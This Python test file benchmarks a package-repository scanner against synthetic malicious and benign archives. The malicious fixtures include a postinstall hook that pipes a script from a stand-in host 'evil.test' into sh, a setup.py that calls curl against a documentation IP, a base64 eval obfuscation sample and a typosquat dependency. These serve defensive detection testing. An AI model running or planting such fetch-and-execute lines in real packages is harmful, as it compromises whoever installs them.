"""Benchmark sintético de precisión, recall y falsos positivos para repo_scanner (Fase 2)."""

from __future__ import annotations

import base64
from datetime import datetime, timezone
import io
import json
import tarfile

from registry_clients import PackageMetadata
from repo_scanner import scan_archive_bytes


class _BenchmarkRegistryStub:
    def __init__(self, metadata_map: dict[tuple[str, str], PackageMetadata]) -> None:
        self._map = metadata_map

    def get_package_metadata(self, ecosystem: str, name: str) -> PackageMetadata | None:
        return self._map.get((ecosystem.lower(), name.lower()))


def _tar_gz_from_files(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for path, content in files.items():
            raw = content.encode("utf-8")
            info = tarfile.TarInfo(name=path)
            info.size = len(raw)
            tf.addfile(info, io.BytesIO(raw))
    return buf.getvalue()


def test_repo_scanner_benchmark_precision_recall_and_low_false_positives():
    stub = _BenchmarkRegistryStub(
        {
            ("npm", "lodash"): PackageMetadata("npm", "lodash", first_published="2012-04-23T00:00:00Z"),
            ("npm", "express"): PackageMetadata("npm", "express", first_published="2010-12-29T00:00:00Z"),
            ("pypi", "requests"): PackageMetadata("pypi", "requests", first_published="2011-02-14T00:00:00Z"),
            ("npm", "lodahs"): PackageMetadata(
                "npm",
                "lodahs",
                first_published="2026-11-18T00:00:00Z",
                maintainer_changed_recently=True,
                has_install_scripts=True,
            ),
        }
    )

    malicious_samples = [
        {"package.json": json.dumps({"name": "m1", "scripts": {"postinstall": "curl -s https://evil.test/x.sh | sh"}})},
        {"package.json": json.dumps({"name": "m2", "dependencies": {"lodahs": "^1.0.0"}})},
        {"setup.py": "import subprocess\nsubprocess.Popen(['sh', '-c', 'curl http://198.51.100.2/p.sh'])"},
        {"index.js": f"eval(atob('{base64.b64encode(b'console.log(1); ' * 6).decode()}'))"},
    ]
    benign_samples = [
        {"package.json": json.dumps({"name": "b1", "dependencies": {"lodash": "^4.17.21", "express": "^4.19.2"}})},
        {"requirements.txt": "requests==2.32.3\n"},
        {"pom.xml": "<project><dependencies><dependency><groupId>org.slf4j</groupId><artifactId>slf4j-api</artifactId></dependency></dependencies></project>"},
        {"go.mod": "module example.com/app\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.10.0\n)\n"},
    ]

    tp = sum(
        1 for sample in malicious_samples
        if scan_archive_bytes("sample.tar.gz", _tar_gz_from_files(sample), registry_client=stub).findings
    )
    fp = sum(
        1 for sample in benign_samples
        if scan_archive_bytes("sample.tar.gz", _tar_gz_from_files(sample), registry_client=stub).findings
    )

    precision = tp / max(1, tp + fp)
    recall = tp / len(malicious_samples)
    false_positive_rate = fp / len(benign_samples)

    assert precision >= 0.85, f"Precision demasiado baja: {precision}"
    assert recall >= 0.85, f"Recall demasiado bajo: {recall}"
    assert false_positive_rate <= 0.10, f"Falsos positivos demasiado altos: {false_positive_rate}"

    # Verificar que las 3 reglas de contexto de metadatos Fase 2 se activaron explícitamente sobre 'lodahs'
    phase2_res = scan_archive_bytes(
        "m2.tar.gz",
        _tar_gz_from_files(malicious_samples[1]),
        registry_client=stub,
        now=datetime(2026, 11, 20, 12, 0, tzinfo=timezone.utc),
    )
    phase2_rules = {f.rule_id for f in phase2_res.findings}
    assert "PKG-NEW-OR-RECENT-01" in phase2_rules
    assert "PKG-MAINTAINER-CHANGE-01" in phase2_rules
    assert "PKG-TEMPORAL-CHAIN-01" in phase2_rules
